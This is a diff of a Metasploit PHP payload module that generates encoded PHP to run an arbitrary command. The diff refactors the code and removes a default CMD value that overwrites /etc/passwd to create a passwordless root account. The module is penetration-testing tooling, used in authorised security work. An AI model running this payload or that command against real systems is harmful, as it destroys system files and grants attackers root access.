@@ -1,16 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Php
@@ -26,8 +26,8 @@ module Metasploit3
       ))
     register_options(
       [
-        OptString.new('CMD', [ true, "The command string to execute", 'echo "toor::0:0:::/bin/bash">/etc/passwd' ]),
-      ], self.class)
+        OptString.new('CMD', [ true, "The command string to execute" ]),
+      ])
   end
 
   def php_exec_cmd
@@ -35,9 +35,9 @@ module Metasploit3
     cmd = Rex::Text.encode_base64(datastore['CMD'])
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     shell = <<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: dis)}
     $c = base64_decode("#{cmd}");
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname=>"$c", :disabled_varname => dis})}
+    #{php_system_block(cmd_varname: "$c", disabled_varname: dis)}
     END_OF_PHP_CODE
 
     return Rex::Text.compress(shell)
@@ -49,5 +49,4 @@ module Metasploit3
   def generate
     return php_exec_cmd
   end
-
 end
